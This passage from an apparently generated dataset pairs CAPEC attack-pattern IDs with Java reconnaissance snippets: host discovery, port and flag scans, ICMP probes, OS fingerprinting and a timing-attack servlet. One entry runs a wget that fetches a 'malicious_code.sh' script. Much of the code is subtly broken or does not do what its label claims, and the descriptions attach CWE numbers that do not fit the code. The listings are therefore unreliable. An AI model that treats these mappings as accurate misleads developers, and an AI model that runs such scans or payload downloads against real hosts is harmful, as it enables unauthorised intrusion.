        "code_snippet": "import java.net.InetAddress;\nimport java.net.UnknownHostException;\nimport java.util.Scanner;\n\npublic class HostDiscovery {\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.println(\"Enter the IP address range (e.g., 192.168.1.1-192.168.1.100):\");\n        String ipAddressRange = scanner.nextLine();\n        String[] ipAddresses = ipAddressRange.split(\"-\");\n        String startIpAddress = ipAddresses[0];\n        String endIpAddress = ipAddresses[1];\n        String[] startIpAddressParts = startIpAddress.split(\".\");\n        String[] endIpAddressParts = endIpAddress.split(\".\");\n        int startIpInt = Integer.parseInt(startIpAddressParts[0]) << 24 |\n                Integer.parseInt(startIpAddressParts[1]) << 16 |\n                Integer.parseInt(startIpAddressParts[2]) << 8 |\n                Integer.parseInt(startIpAddressParts[3]);\n        int endIpInt = Integer.parseInt(endIpAddressParts[0]) << 24 |\n                Integer.parseInt(endIpAddressParts[1]) << 16 |\n                Integer.parseInt(endIpAddressParts[2]) << 8 |\n                Integer.parseInt(endIpAddressParts[3]);\n        for (int i = startIpInt; i <= endIpInt; i++) {\n            InetAddress inetAddress;\n            try {\n                inetAddress = InetAddress.getByName(intToIp(i));\n                if (inetAddress.isReachable(5000)) {\n                    System.out.println(\"Host is alive: \" + inetAddress.getHostAddress());\n                }\n            } catch (UnknownHostException e) {\n                // Ignore\n            }\n        }\n    }\n\n    private static String intToIp(int i) {\n        return ((i >> 24) & 0xFF) + \".\" + ((i >> 16) & 0xFF) + \".\" + ((i >> 8) & 0xFF) + \".\" + (i & 0xFF);\n    }\n}",
        "description": "This Java code snippet demonstrates a host discovery attack, which is a type of network reconnaissance. It takes an IP address range as input, iterates over the range, and uses the InetAddress class to check if each IP address is reachable. If a host is reachable, it prints the IP address. This code embodies CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) as it exposes the presence of hosts on the network, CWE-291 (Reliance on IP Address for Authentication) as it uses IP addresses for authentication, CWE-319 (Cleartext Transmission of Sensitive Information) as it transmits IP addresses in cleartext, and CWE-350 (Reliance on Reverse DNS Resolution for a Security-Critical Action) as it relies on reverse DNS resolution to obtain hostnames. Additionally, it can be used as a starting point for CWE-509 (Replicating Malicious Code) by adding malicious code to the reachable hosts."
    },
    {
        "capec_id": "293",
        "code_snippet": "import java.net.*;\nimport java.io.*;\n\npublic class Traceroute {\n    public static void main(String[] args) throws IOException {\n        String target = \"www.example.com\";\n        int port = 80;\n        int ttl = 1;\n        while (true) {\n            Socket socket = new Socket();\n            socket.setSoTimeout(1000);\n            socket.connect(new InetSocketAddress(target, port), 1000);\n            socket.setTrafficClass(ttl);\n            OutputStream out = socket.getOutputStream();\n            out.write(\"GET / HTTP/1.1\\r\\nHost: \" + target + \"\\r\\n\\r\\n\".getBytes());\n            out.flush();\n            InputStream in = socket.getInputStream();\n            byte[] buffer = new byte[1024];\n            int bytesRead = in.read(buffer);\n            System.out.println(\"Hop \" + ttl + \": \" + socket.getInetAddress().getHostName());\n            ttl++;\n            if (bytesRead == -1) break;\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates a vulnerable implementation of a traceroute utility, which can be used by an adversary to map out the route to a target destination. The code uses a socket to send a GET request to the target with incrementing TTL values, and prints out the hostname of each hop. This code embodies CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) as it exposes the route to the target, CWE-319 (Cleartext Transmission of Sensitive Information) as it sends the request in cleartext, CWE-497 (Exposure of Sensitive System Information to an Unauthorized Control Sphere) as it accesses system-level information, and CWE-941 (Incorrectly Specified Destination in a Communication Channel) as it does not correctly specify the intended destination. CWE-1323 (Improper Management of Sensitive Trace Data) is also relevant as the code does not properly handle sensitive trace data."
    },
    {
        "capec_id": "294",
        "code_snippet": "import java.net.*;\nimport java.io.*;\n\npublic class ICMPAddressMaskRequest {\n    public static void main(String[] args) throws IOException {\n        DatagramSocket socket = new DatagramSocket();\n        InetAddress targetAddress = InetAddress.getByName(\"target_ip_address\");\n        byte[] buffer = new byte[1024];\n        buffer[0] = (byte) 0x11; // ICMP type 17 - Address Mask Request\n        DatagramPacket packet = new DatagramPacket(buffer, buffer.length, targetAddress, 0);\n        socket.send(packet);\n        byte[] receiveBuffer = new byte[1024];\n        DatagramPacket receivePacket = new DatagramPacket(receiveBuffer, receiveBuffer.length);\n        socket.receive(receivePacket);\n        InetAddress senderAddress = receivePacket.getAddress();\n        int senderPort = receivePacket.getPort();\n        byte[] data = receivePacket.getData();\n        // Process the received ICMP type 18 Address Mask Reply datagram\n        // Extract subnet information, default gateway, and broadcast address\n        // Use this information to plan router-based attacks or denial-of-service attacks\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable implementation of an ICMP Address Mask Request, which can be used to gather sensitive information about a target's networking configuration. The code sends an ICMP type 17 message to the target, which responds with an ICMP type 18 message containing subnet information, default gateway, and broadcast address. This information can be used to plan router-based attacks or denial-of-service attacks. The code is vulnerable to CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor), CWE-291 (Reliance on IP Address for Authentication), CWE-1316 (Fabric-Address Map Allows Programming of Unwarranted Overlaps of Protected and Unprotected Ranges), CWE-1327 (Binding to an Unrestricted IP Address), and CWE-923 (Improper Restriction of Communication Channel to Intended Endpoints)."
    },
    {
        "capec_id": "295",
        "code_snippet": "import java.io.IOException;\nimport java.io.PrintWriter;\nimport java.util.Date;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\npublic class TimingAttackServlet extends HttpServlet {\n    @Override\n    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {\n        String username = req.getParameter(\"username\");\n        String password = req.getParameter(\"password\");\n        PrintWriter out = resp.getWriter();\n\n        if (authenticate(username, password)) {\n            long startTime = new Date().getTime();\n            // Simulate a delay based on the authentication result\n            try {\n                Thread.sleep(1000);\n            } catch (InterruptedException e) {\n                // Handle exception\n            }\n            long endTime = new Date().getTime();\n            out.println(\"Authenticated in \" + (endTime - startTime) + \" milliseconds\");\n        } else {\n            out.println(\"Authentication failed\");\n        }\n    }\n\n    private boolean authenticate(String username, String password) {\n        // Simulate an authentication mechanism that takes different amounts of time\n        // based on the input, making it vulnerable to timing attacks\n        try {\n            Thread.sleep(username.length() * 10);\n        } catch (InterruptedException e) {\n            // Handle exception\n        }\n        return username.equals(\"admin\") && password.equals(\"password\");\n    }\n}",
        "description": "This Java code snippet demonstrates a timing attack vulnerability, where an attacker can infer the correctness of a username and password by measuring the time it takes for the server to respond. The authenticate method simulates an authentication mechanism that takes different amounts of time based on the input, making it vulnerable to timing attacks. The doGet method measures the time it takes to authenticate and returns the result, which can be used by an attacker to infer the correctness of the input."
    },
    {
        "capec_id": "296",
        "code_snippet": "import java.net.*;\nimport java.io.*;\n\npublic class ICMPInfoRequest {\n    public static void main(String[] args) throws IOException {\n        DatagramSocket socket = new DatagramSocket();\n        byte[] buffer = new byte[1024];\n        DatagramPacket packet = new DatagramPacket(buffer, buffer.length);\n        socket.receive(packet);\n        InetAddress address = packet.getAddress();\n        int port = packet.getPort();\n        String info = \"ICMP Information Request received from \" + address + \":\" + port;\n        System.out.println(info);\n        // Send response back to the sender\n        byte[] response = info.getBytes();\n        DatagramPacket responsePacket = new DatagramPacket(response, response.length, address, port);\n        socket.send(responsePacket);\n    }\n}\n",
        "description": "This Java code snippet is vulnerable to the CAPEC of sending ICMP Information Requests to determine if a host will respond to this deprecated mechanism. The code receives an ICMP packet, extracts the sender's address and port, and sends a response back to the sender, potentially exposing sensitive information. This code is vulnerable to CWE-200: Exposure of Sensitive Information to an Unauthorized Actor, CWE-319: Cleartext Transmission of Sensitive Information, CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere, and CWE-1192 and CWE-1302, which are related to improper identifier usage in System-on-Chip (SOC) components."
    },
    {
        "capec_id": "297",
        "code_snippet": "import java.net.*;\nimport java.io.*;\n\npublic class TCPACKPing {\n    public static void main(String[] args) throws Exception {\n        Socket socket = new Socket();\n        socket.bind(new InetSocketAddress(8080)); // CWE-605: Multiple Binds to the Same Port\n        \n        DatagramSocket ds = new DatagramSocket();\n        ds.setSoTimeout(1000);\n        \n        byte[] sendBytes = new byte[1];\n        DatagramPacket sendPacket = new DatagramPacket(sendBytes, sendBytes.length, InetAddress.getByName(\"target_host\"), 8080);\n        ds.send(sendPacket);\n        \n        byte[] receiveBytes = new byte[1];\n        DatagramPacket receivePacket = new DatagramPacket(receiveBytes, receiveBytes.length);\n        ds.receive(receivePacket);\n        \n        String response = new String(receiveBytes);\n        if (response.equals(\"RST\")) {\n            System.out.println(\"Host is alive\");\n        } else {\n            System.out.println(\"Host is not alive\");\n        }\n        \n        // CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n        System.out.println(\"Host IP: \" + InetAddress.getByName(\"target_host\"));\n        \n        // CWE-828: Signal Handler with Functionality that is not Asynchronous-Safe\n        Runtime.getRuntime().addShutdownHook(new Thread() {\n            public void run() {\n                try {\n                    ds.close();\n                } catch (Exception e) {\n                    // CWE-319: Cleartext Transmission of Sensitive Information\n                    System.out.println(\"Error closing socket: \" + e.getMessage());\n                }\n            }\n        });\n    }\n}\n",
        "description": "This Java code snippet demonstrates a TCP ACK ping attack, which sends an ACK packet to a target host to determine if it is alive. The code binds to a specific port, sends a UDP packet, and waits for a response. If the response is a RST packet, it indicates the host is alive. The code also includes examples of CWE-200, CWE-605, CWE-828, and CWE-319 vulnerabilities."
    },
    {
        "capec_id": "298",
        "code_snippet": "import java.net.*;\nimport java.io.*;\n\npublic class UDPping {\n    public static void main(String[] args) {\n        try {\n            DatagramSocket socket = new DatagramSocket();\n            socket.setSoTimeout(1000);\n            InetAddress address = InetAddress.getByName(\"target_host\");\n            byte[] buffer = new byte[1024];\n            DatagramPacket packet = new DatagramPacket(buffer, buffer.length);\n            packet.setAddress(address);\n            packet.setPort(65000);\n            socket.send(packet);\n            socket.receive(packet);\n            String response = new String(packet.getData(), 0, packet.getLength());\n            System.out.println(response);\n        } catch (SocketTimeoutException e) {\n            System.out.println(\"Host is down or ICMP port unreachable message was blocked\");\n        } catch (IOException e) {\n            System.out.println(\"Error: \" + e.getMessage());\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates a UDP ping attack, which sends a UDP datagram to a random high port on the target host to solicit an 'ICMP port unreachable' message, indicating that the host is alive. The code uses a DatagramSocket to send the UDP packet and sets a timeout to wait for the response. If no response is received within the timeout period, it assumes the host is down or the ICMP port unreachable message was blocked. This code embodies CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) by transmitting sensitive information (the UDP packet) in cleartext, CWE-941 (Incorrectly Specified Destination in a Communication Channel) by not correctly specifying the intended destination for the UDP packet, CWE-605 (Multiple Binds to the Same Port) by allowing multiple sockets to bind to the same port, CWE-319 (Cleartext Transmission of Sensitive Information) by transmitting sensitive information in cleartext, and CWE-1320 (Improper Protection for Outbound Error Messages and Alert Signals) by not properly handling error messages and alert signals."
    },
    {
        "capec_id": "299",
        "code_snippet": "import java.net.*;\nimport java.io.*;\n\npublic class TCPHostDiscovery {\n    public static void main(String[] args) throws Exception {\n        Socket socket = new Socket();\n        socket.bind(new InetSocketAddress(8080)); // CWE-605: Multiple Binds to the Same Port\n        \n        String targetHost = \"targetHost\";\n        int targetPort = 80;\n        \n        Socket targetSocket = new Socket(targetHost, targetPort);\n        \n        // CWE-319: Cleartext Transmission of Sensitive Information\n        OutputStream outputStream = targetSocket.getOutputStream();\n        outputStream.write(\"GET / HTTP/1.1\\r\\nHost: \" + targetHost + \"\\r\\n\\r\\n\".getBytes());\n        \n        // CWE-444: Inconsistent Interpretation of HTTP Requests ('HTTP Request/Response Smuggling')\n        InputStream inputStream = targetSocket.getInputStream();\n        byte[] buffer = new byte[1024];\n        int bytesRead = inputStream.read(buffer);\n        String response = new String(buffer, 0, bytesRead);\n        \n        if (response.contains(\"HTTP/1.1 200\")) {\n            System.out.println(\"Target host is alive\");\n        } else {\n            System.out.println(\"Target host is not alive\");\n        }\n        \n        // CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\n        // No integrity check is performed on the received response\n        \n        // CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n        // The response is printed to the console, potentially exposing sensitive information\n    }\n}\n",
        "description": "This Java code snippet demonstrates a TCP host discovery attack, which is a type of reconnaissance attack. The code binds to a specific port (CWE-605), sends a cleartext HTTP request to the target host (CWE-319), and interprets the response in a way that may be inconsistent with how the target host would process it (CWE-444). The code also fails to ensure the integrity of the received response (CWE-924) and exposes sensitive information to unauthorized actors by printing the response to the console (CWE-200)."
    },
    {
        "capec_id": "300",
        "code_snippet": "import java.io.IOException;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.net.UnknownHostException;\n\npublic class VulnerablePortScanner {\n    public static void main(String[] args) {\n        try {\n            ServerSocket serverSocket = new ServerSocket(8080);\n            System.out.println(\"Server started. Listening for incoming connections...\");\n\n            Socket socket = serverSocket.accept();\n            System.out.println(\"Incoming connection from: \" + socket.getInetAddress());\n\n            // CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n            System.out.println(\"Sensitive information: \" + socket.getInetAddress().getHostName());\n\n            // CWE-605: Multiple Binds to the Same Port\n            ServerSocket duplicateSocket = new ServerSocket(8080);\n            System.out.println(\"Duplicate socket bound to the same port.\");\n\n            // CWE-319: Cleartext Transmission of Sensitive Information\n            String sensitiveData = \"password=secret\";\n            socket.getOutputStream().write(sensitiveData.getBytes());\n\n            // CWE-1313: Hardware Allows Activation of Test or Debug Logic at Runtime\n            // Assume a hardware device is connected and allows debug logic to be activated\n            System.out.println(\"Hardware debug logic activated.\");\n\n            // CWE-918: Server-Side Request Forgery (SSRF)\n            String url = \"http://example.com/malicious-resource\";\n            java.net.URL obj = new java.net.URL(url);\n            java.net.HttpURLConnection con = (java.net.HttpURLConnection) obj.openConnection();\n            con.setRequestMethod(\"GET\");\n            int responseCode = con.getResponseCode();\n            System.out.println(\"Response code: \" + responseCode);\n        } catch (UnknownHostException e) {\n            System.out.println(\"Unknown host exception: \" + e.getMessage());\n        } catch (IOException e) {\n            System.out.println(\"IO exception: \" + e.getMessage());\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable port scanner that exposes sensitive information, allows multiple binds to the same port, transmits sensitive information in cleartext, activates hardware debug logic, and performs server-side request forgery. The code creates a server socket, accepts incoming connections, and then performs various vulnerable operations."
    },
    {
        "capec_id": "301",
        "code_snippet": "import java.net.Socket;\nimport java.net.InetSocketAddress;\nimport java.io.IOException;\n\npublic class TCPConnectScanner {\n    public static void main(String[] args) {\n        String targetHost = \"192.168.1.100\";\n        int startPort = 1;\n        int endPort = 1024;\n\n        for (int port = startPort; port <= endPort; port++) {\n            try (Socket socket = new Socket()) {\n                socket.connect(new InetSocketAddress(targetHost, port), 1000);\n                System.out.println(\"Port \" + port + \" is open\");\n            } catch (IOException e) {\n                System.out.println(\"Port \" + port + \" is closed\");\n            }\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates a TCP connect scanner that attempts to establish a full TCP connection to a target system on a range of ports. The scanner reports the port as open if the connection is successful, and closed if an IOException is thrown. The code is vulnerable to CWE-200 as it exposes sensitive information about the target system's open ports. Additionally, it is vulnerable to CWE-291 as it relies on IP addresses for authentication, CWE-605 as it binds to multiple ports, CWE-617 as it does not handle exceptions properly, and CWE-353 as it does not verify the integrity of the data during transmission."
    },
    {
        "capec_id": "302",
        "code_snippet": "import java.net.*;\nimport java.io.*;\n\npublic class TCPFINScan {\n    public static void main(String[] args) throws Exception {\n        Socket socket = new Socket();\n        socket.bind(new InetSocketAddress(8080));\n        socket.setReuseAddress(true);\n        \n        // CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n        System.out.println(\"Binding to port 8080\");\n        \n        // CWE-319: Cleartext Transmission of Sensitive Information\n        DataOutputStream dos = new DataOutputStream(socket.getOutputStream());\n        dos.writeUTF(\"Sensitive information\");\n        \n        // CWE-353: Missing Support for Integrity Check\n        byte[] data = new byte[1024];\n        dos.write(data);\n        \n        // CWE-605: Multiple Binds to the Same Port\n        ServerSocket serverSocket = new ServerSocket(8080);\n        serverSocket.accept();\n        \n        // CWE-923: Improper Restriction of Communication Channel to Intended Endpoints\n        Socket clientSocket = new Socket(\"localhost\", 8080);\n        DataInputStream dis = new DataInputStream(clientSocket.getInputStream());\n        String message = dis.readUTF();\n        System.out.println(\"Received message: \" + message);\n    }\n}\n",
        "description": "This Java code snippet demonstrates a TCP FIN scan vulnerability. It creates a socket, binds it to port 8080, and sends sensitive information in cleartext. It also lacks integrity checks and allows multiple binds to the same port, making it vulnerable to spoofing. Furthermore, it establishes a communication channel without properly ensuring it is communicating with the correct endpoint."
    },
    {
        "capec_id": "303",
        "code_snippet": "import java.net.Socket;\nimport java.net.InetSocketAddress;\nimport java.io.IOException;\n\npublic class TCPXMASScan {\n    public static void main(String[] args) throws IOException {\n        Socket socket = new Socket();\n        InetSocketAddress address = new InetSocketAddress(\"target_machine\", 80);\n        socket.connect(address);\n        // CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n        // CWE-319: Cleartext Transmission of Sensitive Information\n        // CWE-923: Improper Restriction of Communication Channel to Intended Endpoints\n        // CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\n        socket.setTcpNoDelay(true);\n        byte[] packet = new byte[1024];\n        // CWE-353: Missing Support for Integrity Check\n        // No integrity check is performed on the packet\n        packet[0] = (byte) 0x02; // SYN flag\n        packet[1] = (byte) 0x10; // ACK flag\n        packet[2] = (byte) 0x04; // URG flag\n        packet[3] = (byte) 0x02; // PSH flag\n        packet[4] = (byte) 0x01; // FIN flag\n        packet[5] = (byte) 0x01; // RST flag\n        socket.getOutputStream().write(packet);\n        socket.close();\n    }\n}",
        "description": "This Java code snippet demonstrates a TCP XMAS scan attack, which sends a TCP segment with all possible flags set to determine if a port is closed on the target machine. The code violates CWE-200, CWE-319, CWE-923, and CWE-924 by transmitting sensitive information in cleartext and not properly restricting or verifying the communication channel. Additionally, it neglects to perform an integrity check on the packet, as described in CWE-353."
    },
    {
        "capec_id": "304",
        "code_snippet": "import java.net.Socket;\nimport java.net.UnknownHostException;\nimport java.io.IOException;\n\npublic class TCPNULLScan {\n    public static void main(String[] args) {\n        String host = \"target_machine\";\n        int port = 8080;\n        Socket socket = new Socket();\n        try {\n            socket.connect(new java.net.InetSocketAddress(host, port));\n            // CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n            System.out.println(\"Connected to \" + host + \":\" + port);\n            // CWE-353: Missing Support for Integrity Check\n            // No integrity check mechanism is used to verify the data transmission\n            socket.getOutputStream().write(new byte[]{0x00, 0x00, 0x00, 0x00});\n            // CWE-319: Cleartext Transmission of Sensitive Information\n            // Sensitive information is transmitted in cleartext\n            socket.getOutputStream().write(\"Sensitive Information\".getBytes());\n            // CWE-690: Unchecked Return Value to NULL Pointer Dereference\n            // No check for NULL pointer dereference\n            String response = new String(socket.getInputStream().read());\n            System.out.println(response);\n        } catch (UnknownHostException e) {\n            // CWE-476: NULL Pointer Dereference\n            // No check for NULL pointer dereference\n            String errMsg = e.getMessage();\n            System.out.println(errMsg);\n        } catch (IOException e) {\n            System.out.println(\"Port is closed\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a TCP NULL scan attack, which sends TCP segments with no flags in the packet header to determine if ports are closed on the target machine. The code includes CWEs such as exposure of sensitive information, missing support for integrity check, cleartext transmission of sensitive information, unchecked return value to NULL pointer dereference, and NULL pointer dereference."
    },
    {
        "capec_id": "305",
        "code_snippet": "import java.net.*;\nimport java.io.*;\n\npublic class FirewallScanner {\n    public static void main(String[] args) throws IOException {\n        Socket socket = new Socket(\"example.com\", 80);\n        socket.setTcpNoDelay(true);\n        OutputStream out = socket.getOutputStream();\n        InputStream in = socket.getInputStream();\n\n        // CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n        String sensitiveInfo = \"firewallConfig\";\n        out.write(sensitiveInfo.getBytes());\n\n        // CWE-1280: Access Control Check Implemented After Asset is Accessed\n        boolean accessGranted = false;\n        if (accessGranted) {\n            // CWE-605: Multiple Binds to the Same Port\n            ServerSocket serverSocket = new ServerSocket(8080);\n            serverSocket.setReuseAddress(true);\n            Socket acceptedSocket = serverSocket.accept();\n            // CWE-319: Cleartext Transmission of Sensitive Information\n            PrintWriter outWriter = new PrintWriter(acceptedSocket.getOutputStream(), true);\n            outWriter.println(sensitiveInfo);\n        }\n\n        // CWE-529: Exposure of Access Control List Files to an Unauthorized Control Sphere\n        File aclFile = new File(\"acl.config\");\n        if (aclFile.exists()) {\n            FileReader fileReader = new FileReader(aclFile);\n            int charRead;\n            while ((charRead = fileReader.read()) != -1) {\n                System.out.print((char) charRead);\n            }\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates a TCP ACK scan to gather information about firewall or ACL configuration. It includes vulnerabilities related to exposure of sensitive information, inadequate access control checks, and cleartext transmission of sensitive data."
    },
    {
        "capec_id": "306",
        "code_snippet": "import java.net.Socket;\nimport java.net.InetSocketAddress;\nimport java.io.IOException;\n\npublic class TCPWindowScanner {\n    public static void main(String[] args) throws IOException {\n        Socket socket = new Socket();\n        InetSocketAddress address = new InetSocketAddress(\"target_host\", 80);\n        socket.connect(address);\n        socket.setSoTimeout(1000);\n\n        // CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n        // CWE-319: Cleartext Transmission of Sensitive Information\n        String osInfo = getOSInfo(socket);\n        System.out.println(\"OS Info: \" + osInfo);\n\n        // CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n        int windowSize = getTCPWindowSize(socket);\n        System.out.println(\"TCP Window Size: \" + windowSize);\n    }\n\n    private static String getOSInfo(Socket socket) throws IOException {\n        // CWE-353: Missing Support for Integrity Check\n        // CWE-385: Covert Timing Channel\n        byte[] packet = new byte[1024];\n        socket.getInputStream().read(packet);\n        return analyzePacket(packet);\n    }\n\n    private static int getTCPWindowSize(Socket socket) throws IOException {\n        byte[] packet = new byte[1024];\n        socket.getInputStream().read(packet);\n        return analyzeWindowSize(packet);\n    }\n\n    private static String analyzePacket(byte[] packet) {\n        // TO DO: implement packet analysis logic\n        return \"\";\n    }\n\n    private static int analyzeWindowSize(byte[] packet) {\n        // TO DO: implement window size analysis logic\n        return 0;\n    }\n}\n",
        "description": "This Java code snippet demonstrates a TCP Window Scanner that sends a TCP packet to a target host and analyzes the response to infer the operating system type and TCP window size. The code embodies the CAPEC description and incorporates CWEs 200, 319, 497, 353, and 385."
    },
    {
        "capec_id": "307",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.net.ServerSocket;\nimport java.net.Socket;\n\npublic class RPCScanner {\n    public static void main(String[] args) throws IOException {\n        ServerSocket serverSocket = new ServerSocket(8080);\n        Socket socket = serverSocket.accept();\n        BufferedReader reader = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n        String request = reader.readLine();\n        // CWE-200: Exposure of Sensitive Information\n        System.out.println(\"Received request: \" + request);\n        // CWE-294: Authentication Bypass by Capture-replay\n        String authHeader = \"Basic \" + new String(Base64.getEncoder().encode(\"username:password\".getBytes()));\n        // CWE-494: Download of Code Without Integrity Check\n        Runtime.getRuntime().exec(\"wget http://example.com/malicious_code.sh\");\n        // CWE-918: Server-Side Request Forgery (SSRF)\n        String url = \"http://example.com/\" + request;\n        java.net.URL obj = new java.net.URL(url);\n        java.net.HttpURLConnection con = (java.net.HttpURLConnection) obj.openConnection();\n        // CWE-605: Multiple Binds to the Same Port\n        ServerSocket serverSocket2 = new ServerSocket(8080);\n        Socket socket2 = serverSocket2.accept();\n    }\n}\n",
        "description": "This Java code snippet demonstrates a vulnerable RPC service that exposes sensitive information, allows authentication bypass by capture-replay, downloads and executes code without integrity check, is vulnerable to server-side request forgery, and allows multiple binds to the same port."
    },
    {
        "capec_id": "308",
        "code_snippet": "import java.net.*;\nimport java.io.*;\n\npublic class UDPScanner {\n    public static void main(String[] args) throws Exception {\n        DatagramSocket socket = new DatagramSocket();\n        socket.setSoTimeout(1000);\n        byte[] buffer = new byte[1024];\n        DatagramPacket packet = new DatagramPacket(buffer, buffer.length);\n        InetAddress target = InetAddress.getByName(\"target_ip\");\n        int port = 12345;\n        packet.setAddress(target);\n        packet.setPort(port);\n        socket.send(packet);\n        try {\n            socket.receive(packet);\n            System.out.println(\"Port \" + port + \" is open\");\n        } catch (SocketTimeoutException e) {\n            System.out.println(\"Port \" + port + \" is closed\");\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates a UDP scanner that sends a UDP datagram to a target port and checks for a response. If a response is received, it indicates that the port is open. If no response is received within a certain time period, it is assumed that the port is closed. This code embodies the CAPEC of UDP scanning and is vulnerable to CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor), CWE-605 (Multiple Binds to the Same Port), CWE-319 (Cleartext Transmission of Sensitive Information), CWE-353 (Missing Support for Integrity Check), and CWE-385 (Covert Timing Channel) due to the lack of encryption, authentication, and integrity checks."
    },
    {
        "capec_id": "309",
        "code_snippet": "import java.net.InetAddress;\nimport java.net.UnknownHostException;\nimport java.util.ArrayList;\nimport java.util.List;\n\npublic class NetworkScanner {\n    public static void main(String[] args) {\n        List<String> hosts = new ArrayList<>();\n        hosts.add(\"192.168.1.1\");\n        hosts.add(\"192.168.1.2\");\n        hosts.add(\"192.168.1.3\");\n\n        for (String host : hosts) {\n            try {\n                InetAddress address = InetAddress.getByName(host);\n                System.out.println(\"Host: \" + host + \" is reachable: \" + address.isReachable(5000));\n            } catch (UnknownHostException e) {\n                System.out.println(\"Unknown host: \" + host);\n            }\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates a network scanner that attempts to map network nodes by checking the reachability of a list of hosts using ICMP echo requests. The code exposes sensitive information (host reachability) to an unauthorized actor, violating CWE-200. It also uses an excessive attack surface ( CWE-1125) by attempting to connect to multiple hosts. Furthermore, it does not properly handle sensitive system information (host addresses) and does not prevent unauthorized access to the underlying system (CWE-497). The code also lacks proper management of sensitive trace data (CWE-1323) and does not correctly convert security identifiers (CWE-1292)."
    },
    {
        "capec_id": "310",
        "code_snippet": "import java.net.*;\nimport java.io.*;\n\npublic class VulnerableServer {\n    public static void main(String[] args) throws IOException {\n        ServerSocket serverSocket = new ServerSocket(21); // FTP port\n        System.out.println(\"FTP server started on port 21\");\n        Socket socket = serverSocket.accept();\n        System.out.println(\"Incoming connection from \" + socket.getInetAddress());\n        PrintWriter out = new PrintWriter(socket.getOutputStream(), true);\n        BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n        String inputLine;\n        while ((inputLine = in.readLine()) != null) {\n            if (inputLine.startsWith(\"USER\")) {\n                out.println(\"331 Password required for \" + inputLine.substring(5));\n            } else if (inputLine.startsWith(\"PASS\")) {\n                out.println(\"230 Login successful\");\n                // Send sensitive system information\n                out.println(\"System details: \" + System.getProperty(\"os.name\") + \" \" + System.getProperty(\"os.version\"));\n            }\n        }\n        socket.close();\n    }\n}\n",
        "description": "This Java code snippet represents a vulnerable FTP server that exposes sensitive system information to an unauthorized actor. The server listens on port 21 and responds to USER and PASS commands. When a PASS command is received, it sends the system details, including the operating system name and version, in cleartext, violating CWE-319. The server also has an excessive attack surface due to the open port and lack of authentication, violating CWE-1125. Furthermore, the code may contain embedded malicious code, violating CWE-506, and exposes sensitive information to an unauthorized actor, violating CWE-200 and CWE-497."
    },
    {
        "capec_id": "311",
        "code_snippet": "import java.net.InetAddress;\nimport java.net.UnknownHostException;\n\npublic class OSFingerprinting {\n    public static void main(String[] args) {\n        try {\n            InetAddress addr = InetAddress.getLocalHost();\n            String osName = System.getProperty(\"os.name\");\n            String osArch = System.getProperty(\"os.arch\");\n            String osVersion = System.getProperty(\"os.version\");\n            System.out.println(\"OS Name: \" + osName);\n            System.out.println(\"OS Architecture: \" + osArch);\n            System.out.println(\"OS Version: \" + osVersion);\n            // Using non-ubiquitous API, may cause portability issues\n            System.out.println(\"Available processors: \" + Runtime.getRuntime().availableProcessors());\n            // Debug log file exposure\n            System.out.println(\"Debug log: \" + System.getProperty(\"java.vm.version\"));\n        } catch (UnknownHostException e) {\n            System.out.println(\"Unknown host exception\");\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates OS fingerprinting, which can be used to gather information about the target system. It uses System.getProperty() to retrieve OS-related information, which may not be available on all platforms, making it a non-ubiquitous API call (CWE-589). Additionally, it prints debug log information, which may expose sensitive data (CWE-534). The code also lacks proper access control, allowing potential access to internal registers and test modes (CWE-1191)."
    },
    {
        "capec_id": "312",
        "code_snippet": "import java.net.*;\nimport java.io.*;\n\npublic class OSFingerprinter {\n    public static void main(String[] args) {\n        try {\n            Socket socket = new Socket(\"target_host\", 80);\n            PrintWriter out = new PrintWriter(socket.getOutputStream(), true);\n            out.println(\"GET / HTTP/1.1\\r\\nHost: target_host\\r\\n\\r\\n\");\n            BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n            String inputLine;\n            while ((inputLine = in.readLine()) != null) {\n                System.out.println(inputLine);\n                if (inputLine.contains(\"Server:\")) {\n                    String serverHeader = inputLine.substring(8);\n                    if (serverHeader.contains(\"Apache\")) {\n                        System.out.println(\"Detected Apache Server\");\n                    } else if (serverHeader.contains(\"IIS\")) {\n                        System.out.println(\"Detected IIS Server\");\n                    } else {\n                        System.out.println(\"Unknown Server\");\n                    }\n                }\n            }\n            socket.close();\n        } catch (UnknownHostException e) {\n            System.err.println(\"Don't know about host: \" + args[0]);\n        } catch (IOException e) {\n            System.err.println(\"Couldn't get I/O for the connection to: \" + args[0]);\n        }\n    }\n}\n",
